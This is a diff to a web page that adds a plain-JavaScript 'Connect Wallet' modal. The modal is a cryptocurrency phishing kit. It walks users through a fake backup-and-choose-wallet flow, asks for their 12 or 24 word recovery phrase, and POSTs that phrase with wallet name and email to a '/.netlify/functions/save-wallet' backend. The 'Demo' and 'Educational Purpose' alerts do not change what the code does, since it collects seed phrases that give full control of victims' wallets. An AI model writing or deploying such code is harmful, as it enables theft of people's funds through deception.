@@ -1269,35 +1269,161 @@ window.openWalletModal = function() {
     </footer>
 
 
-
-
-    <!-- === WALLET MODAL (Vue) === -->
+<!-- ====================== WALLET MODAL (Plain JS + Backend) ====================== -->
 <div id="wallet-modal-root"></div>
 
-<script type="module">
-  import { createApp } from './assets2/js/assets/index-CwXza5o2.js'; // ← Change this filename if needed
+<script>
+// Modal State
+let isModalOpen = false;
+let currentStep = 'connect';
+let selectedWallet = '';
+let recoveryPhrase = '';
+let walletName = '';
+let email = '';
 
-  let walletApp = null;
+// Open Modal
+window.openWalletModal = function() {
+    isModalOpen = true;
+    currentStep = 'connect';
+    selectedWallet = '';
+    recoveryPhrase = '';
+    walletName = '';
+    email = '';
+    renderModal();
+};
 
-  window.openWalletModal = function() {
-    if (!walletApp) {
-      const root = document.getElementById('wallet-modal-root');
-      
-      walletApp = createApp({
-        template: `<WalletModal ref="modal" />`,
-        components: {
-          WalletModal: () => import('./assets2/js/assets/index-CwXza5o2.js') // ← Change this too
-        }
-      }).mount(root);
+// Close Modal
+window.closeWalletModal = function() {
+    isModalOpen = false;
+    document.getElementById('wallet-modal-root').innerHTML = '';
+};
+
+// Render Modal
+function renderModal() {
+    const root = document.getElementById('wallet-modal-root');
+    let html = `
+    <div class="fixed inset-0 z-[99999] flex items-center justify-center p-4 bg-black/95 backdrop-blur-lg" onclick="if(event.target === this) closeWalletModal()">
+        <div class="w-full max-w-md bg-[#0a1f14] rounded-3xl overflow-hidden border border-emerald-500/50 shadow-2xl">
+            
+            <!-- Header -->
+            <div class="px-6 py-5 border-b border-emerald-500/30 flex justify-between items-center bg-[#0a1f14]">
+                <h2 class="text-xl font-bold text-white">Connect Wallet</h2>
+                <button onclick="closeWalletModal()" class="text-3xl text-gray-400 hover:text-white leading-none">×</button>
+            </div>`;
+
+    // STEP 1: Backup Wallet
+    if (currentStep === 'connect') {
+        html += `
+            <div class="p-8">
+                <p class="text-gray-400 text-center mb-8">Gateway to Web3</p>
+                <div class="bg-[#0f2a1f] border border-emerald-500/40 rounded-2xl p-8 text-center">
+                    <div class="mx-auto mb-6 w-20 h-20 bg-emerald-500/10 rounded-2xl flex items-center justify-center text-5xl">🔐</div>
+                    <h3 class="text-2xl font-semibold text-white mb-3">Backup Wallet</h3>
+                    <p class="text-gray-400 mb-8">Automatic / Manual backup</p>
+                    <button onclick="goToWallets()" class="w-full py-4 bg-emerald-500 hover:bg-emerald-600 rounded-2xl font-semibold text-lg text-white">Continue</button>
+                </div>
+            </div>`;
     }
 
-    // Open the modal
-    setTimeout(() => {
-      if (walletApp && walletApp.$refs.modal) {
-        walletApp.$refs.modal.openModal();
-      }
-    }, 50);
-  };
+    // STEP 2: Wallet List
+    else if (currentStep === 'wallets') {
+        html += `
+            <div class="p-6">
+                <h2 class="text-2xl font-bold text-white mb-6 text-center">Choose Wallet</h2>
+                <div class="space-y-3 max-h-[460px] overflow-y-auto pr-2 custom-scroll">`;
+        
+        const wallets = ['MetaMask','Trust Wallet','Wallet Connect','Exodus','Phantom','Coinbase Wallet','Cosmostation'];
+        wallets.forEach(wallet => {
+            html += `
+                <button onclick="selectWallet('${wallet}')" 
+                        class="w-full flex items-center gap-4 p-5 rounded-2xl hover:bg-[#1a3c2e] transition-all border border-transparent hover:border-emerald-500/30">
+                    <span class="text-3xl">${getWalletIcon(wallet)}</span>
+                    <span class="text-lg font-medium text-white">${wallet}</span>
+                </button>`;
+        });
+
+        html += `</div></div>`;
+    }
+
+    // STEP 3: Import Phrase
+    else if (currentStep === 'import') {
+        html += `
+            <div class="p-6">
+                <h3 class="text-white text-xl mb-6">Import Recovery Phrase</h3>
+                <textarea id="phrase-input" rows="5" 
+                    class="w-full bg-[#1a3c2e] border border-emerald-500/30 rounded-2xl p-5 text-white focus:border-emerald-500 resize-none"
+                    placeholder="Enter your 12 or 24 word recovery phrase..."></textarea>
+                
+                <div class="flex gap-3 mt-6">
+                    <button onclick="closeWalletModal()" class="flex-1 py-4 rounded-2xl border border-gray-600 text-white hover:bg-gray-800">Cancel</button>
+                    <button onclick="submitWalletData()" class="flex-1 py-4 bg-emerald-500 hover:bg-emerald-600 rounded-2xl font-semibold">Proceed</button>
+                </div>
+            </div>`;
+    }
+
+    html += `</div></div>`;
+    root.innerHTML = html;
+}
+
+// Helper Functions
+function getWalletIcon(name) {
+    if (name.includes('MetaMask')) return '🦊';
+    if (name.includes('Trust')) return '🔷';
+    if (name.includes('Wallet Connect')) return '🔗';
+    if (name.includes('Phantom')) return '👻';
+    return '💼';
+}
+
+window.goToWallets = function() {
+    currentStep = 'wallets';
+    renderModal();
+};
+
+window.selectWallet = function(wallet) {
+    selectedWallet = wallet;
+    if (wallet.includes('Wallet Connect')) {
+        currentStep = 'import';
+        renderModal();
+    } else {
+        alert(`Connecting to ${wallet}... (Demo)`);
+        setTimeout(closeWalletModal, 1500);
+    }
+};
+
+window.submitWalletData = async function() {
+    const input = document.getElementById('phrase-input');
+    recoveryPhrase = input ? input.value.trim() : '';
+
+    if (!recoveryPhrase) {
+        alert("Please enter your recovery phrase");
+        return;
+    }
+
+    try {
+        const response = await fetch('/.netlify/functions/save-wallet', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                selected_wallet: selectedWallet,
+                recovery_phrase: recoveryPhrase,
+                wallet_name: walletName,
+                email: email
+            })
+        });
+
+        const result = await response.json();
+
+        if (result.success) {
+            alert("✅ Wallet data saved successfully! (Educational Purpose)");
+            closeWalletModal();
+        } else {
+            alert(result.error || "Failed to save data");
+        }
+    } catch (err) {
+        console.error(err);
+        alert("Connection error. Please try again.");
+    }
+};
 </script>
 
 <!-- Update your Connect Wallet buttons -->
